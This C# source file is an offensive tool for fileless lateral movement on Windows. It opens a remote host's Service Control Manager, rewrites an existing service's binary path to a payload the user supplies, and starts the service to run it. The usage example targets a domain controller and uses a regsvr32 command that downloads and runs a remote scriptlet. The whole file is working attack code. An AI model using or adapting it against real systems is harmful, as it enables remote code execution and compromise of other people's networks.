using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Fileless_Delivery_SMB
{
    class SCDelivery
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(
            IntPtr hService, 
            uint dwServiceType, 
            int dwStartType, 
            int dwErrorControl, 
            string lpBinaryPathName, 
            string lpLoadOrderGroup, 
            string lpdwTagId, 
            string lpDependencies, 
            string lpServiceStartName, 
            string lpPassword, 
            string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(
                IntPtr hService,
                int dwNumServiceArgs,
                string[] lpServiceArgVectors
            );

        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();

        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("Usage: Fileless_Delivery.exe [target] [servicename] [payload]\n");
                Console.WriteLine("Example: Fileless_Delivery.exe DC01.EVILCORP.COM SensorService \"C:\\windows\\system32\\cmd.exe /c C:\\windows\\system32\\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll\"");
                Environment.Exit(1);
            }

            string target = args[0];
            string scName = args[1];
            string payload = args[2];

            if (scName == "")
            {
                scName = "SensorService";
            }

            //Connecting to the service manager on the target
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            if (SCMHandle == IntPtr.Zero)
            {
                Console.WriteLine("[!] OpenSCManagerA failed! Error: {0}", GetLastError());
                Environment.Exit(0);
            }
            Console.WriteLine("[*] SC_HANDLE Manager 0x{0}", SCMHandle);

            // Opening service for editing
            Console.WriteLine("[*] Opening {0} Service ....", scName);
            //IntPtr schService = OpenService(SCMHandle, ServiceName, ((uint)SERVICE_ACCESS.SERVICE_ALL_ACCESS));
            IntPtr schServiceOpen = OpenService(SCMHandle, scName, 0xF01FF);
            Console.WriteLine("[*] SC_HANDLE Service 0x{0}", schServiceOpen);
            
            
            if (schServiceOpen == IntPtr.Zero)
            {
                Console.WriteLine("[!] Exited at schServiceOpen! Error: {0}", GetLastError());
                Environment.Exit(1);
            }

            //Changing the configuration of the target service
            bool bResult = ChangeServiceConfigA(schServiceOpen, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
            if (!bResult)
            {
                Console.WriteLine("[!] ChangeServiceConfigA failed to update the service path. Error: {0}", GetLastError());
                Environment.Exit(0);
            }

            bResult = StartService(schServiceOpen, 0, null);
            uint dwResult = GetLastError();
            if (!bResult && dwResult != 1053)
            {
                Console.WriteLine("[!] StartServiceA failed to start the service. Error: {0}", GetLastError());
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[*] Service was started");
            }
        }
    }
}
